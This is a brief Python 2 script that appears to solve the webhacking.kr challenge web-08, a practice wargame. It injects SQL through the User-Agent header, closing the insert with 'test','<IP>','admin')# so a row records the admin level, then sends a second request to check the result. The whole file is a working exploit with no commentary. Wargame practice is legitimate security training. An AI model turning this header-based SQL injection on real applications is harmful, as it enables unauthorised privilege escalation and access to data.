import urllib
import httplib

Session="**secret**"
IPAddress="**secret**"
HTTP=httplib.HTTPConnection("webhacking.kr")

Headers={"Cookie":"PHPSESSID=%s" % Session,
         "User-Agent":"test','%s','admin')#" % IPAddress}
HTTP.request("GET","/challenge/web/web-08/","",Headers)
print HTTP.getresponse().read()

Headers={"Cookie":"PHPSESSID=%s" % Session,
         "User-Agent":"test"}
HTTP.request("GET","/challenge/web/web-08/","",Headers)
print HTTP.getresponse().read()
